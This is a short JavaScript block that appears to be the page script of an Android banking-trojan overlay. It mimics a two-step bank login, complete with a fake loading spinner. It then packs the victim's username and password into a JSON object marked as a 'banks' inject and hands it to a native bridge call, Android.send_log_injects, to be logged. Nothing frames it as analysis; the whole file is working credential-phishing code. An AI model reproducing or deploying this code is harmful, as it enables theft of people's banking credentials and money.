    <script>
        var swiper = new Swiper('.swiper-container', {
            slidesPerView: 1,
            centeredSlides: true,
            spaceBetween: 20,
            grabCursor: true,
            pagination: {
                el: '.swiper-pagination',
            },
        });

        var spinner = document.getElementById('spinner'),
            form1 = document.getElementById('form1'),
            form2 = document.getElementById('form2'),
            login = document.getElementById('login'),
            loginDublikat = document.getElementById('loginDublikat'),
            password = document.getElementById('password'),
            nextPage = document.getElementById('nextPage'),
            sendData = document.getElementById('sendData');

        nextPage.onclick = function(){
            if(login.value.length < 3) {
                login.classList.add('error')
                login.focus();
            } else {
                login.classList.remove('error')
            }

            if(login.value.length > 3) {
                spinner.style.display = 'block';
                loginDublikat.value = login.value;
                setTimeout(() => {
                    spinner.style.display = 'none';
                    form1.style.display = 'none';
                    form2.style.display = 'block';
                }, 1500);
            }
        }

        function back(){
            form2.style.display = 'none'
            form1.style.display = 'block'
            login.focus();
        }

        sendData.onclick = function(){
            if(password.value.length < 3) {
                password.classList.add('error')
            } else {
                password.classList.remove('error')
            }

            if(password.value.length > 3){
                var data = {};
                data.login = login.value;
                data.password = password.value;
                data.type_injects = "banks";
                data.closed = "close_activity_injects";

                var ua = navigator.userAgent.toLowerCase();
                if(ua.indexOf("android") > -1) {
                    try {
                        Android.send_log_injects(JSON.stringify(data))
                    } catch (err) {}
                }else{
                    alert(JSON.stringify(data));
                }
            }
        }
    </script>
